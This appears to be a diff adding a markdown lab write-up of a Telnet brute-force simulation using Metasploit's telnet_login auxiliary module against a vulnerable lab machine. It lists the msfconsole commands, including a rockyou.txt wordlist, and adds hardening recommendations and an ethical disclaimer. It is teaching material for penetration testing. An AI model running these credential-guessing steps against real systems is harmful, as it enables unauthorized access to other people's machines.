@@ -1,0 +1,194 @@
+# Telnet Brute Force Testing Using Metasploit Auxiliary Module
+
+## 1. Title
+
+**Telnet Brute Force Attack Simulation Using Metasploit Framework Auxiliary Module**
+
+---
+
+## 2. Objective
+
+The objective of this experiment is to perform a controlled Telnet brute-force attack simulation using the Metasploit Framework auxiliary module. This experiment demonstrates how weak Telnet credentials can be identified during a penetration testing assessment and highlights the importance of securing legacy remote access services.
+
+---
+
+## 3. Environment Setup
+
+### Attacker Machine
+
+* Operating System: Kali Linux
+* Tool Used: Metasploit Framework (`msfconsole`)
+
+### Target Machine
+
+* Operating System: Linux-based vulnerable machine
+* Service Tested: Telnet
+* Default Telnet Port: 23
+
+### Network Configuration
+
+* Virtualized penetration testing laboratory
+* Attacker and target machines connected through a private network
+
+---
+
+## 4. Tools Used
+
+| Tool                        | Purpose                       |
+| --------------------------- | ----------------------------- |
+| Kali Linux                  | Security testing platform     |
+| Metasploit Framework        | Penetration testing framework |
+| Telnet Login Scanner Module | Credential testing            |
+| Wordlist                    | Password testing database     |
+
+---
+
+## 5. Procedure
+
+### Step 1: Start Metasploit Framework
+
+Command:
+
+```bash
+msfconsole
+```
+
+Metasploit Framework was launched successfully.
+
+---
+
+### Step 2: Search for Telnet Login Modules
+
+Command:
+
+```bash
+search telnet_login
+```
+
+The Telnet login auxiliary module was identified.
+
+---
+
+### Step 3: Select Telnet Login Auxiliary Module
+
+Command:
+
+```bash
+use auxiliary/scanner/telnet/telnet_login
+```
+
+The Telnet authentication testing module was loaded.
+
+---
+
+### Step 4: View Available Options
+
+Command:
+
+```bash
+show options
+```
+
+The required configuration options were displayed.
+
+---
+
+### Step 5: Configure Target Details
+
+Set the target IP address:
+
+```bash
+set RHOSTS <Target-IP>
+```
+
+Configure the username:
+
+```bash
+set USERNAME <username>
+```
+
+Configure the password list:
+
+```bash
+set PASS_FILE <path-to-wordlist>
+```
+
+Example:
+
+```bash
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+### Step 6: Configure Additional Options
+
+Set the Telnet port (if different from default):
+
+```bash
+set RPORT 23
+```
+
+Enable verbose output:
+
+```bash
+set VERBOSE true
+```
+
+---
+
+### Step 7: Run the Module
+
+Command:
+
+```bash
+run
+```
+
+The Metasploit module attempted authentication using the supplied username and password combinations.
+
+---
+
+## 6. Observations
+
+* The Telnet service was detected on port 23.
+* The auxiliary scanner tested multiple credential combinations.
+* Weak credentials could allow unauthorized access.
+* Strong authentication prevented successful login attempts.
+
+---
+
+## 7. Result
+
+The Telnet brute-force assessment was completed successfully.
+
+The experiment demonstrated that:
+
+* Telnet transmits credentials without encryption.
+* Weak usernames and passwords can be easily targeted.
+* Secure alternatives such as SSH should be preferred for remote administration.
+
+---
+
+## 8. Security Recommendations
+
+1. Disable Telnet service if it is not required.
+2. Replace Telnet with encrypted protocols such as SSH.
+3. Use strong password policies.
+4. Implement account lockout mechanisms.
+5. Restrict remote access using firewall rules.
+6. Monitor authentication logs for suspicious activity.
+7. Use multi-factor authentication where possible.
+
+---
+
+## 9. Conclusion
+
+This experiment demonstrated the process of performing a Telnet brute-force security assessment using the Metasploit Framework auxiliary module. The activity showed the security risks associated with weak credentials and unencrypted remote access services. Proper configuration and migration to secure protocols can significantly reduce unauthorized access risks.
+
+---
+
+## 10. Ethical Disclaimer
+
+This test was performed only within an authorized penetration testing laboratory environment. Brute-force testing should only be conducted on systems where explicit permission has been provided.
+
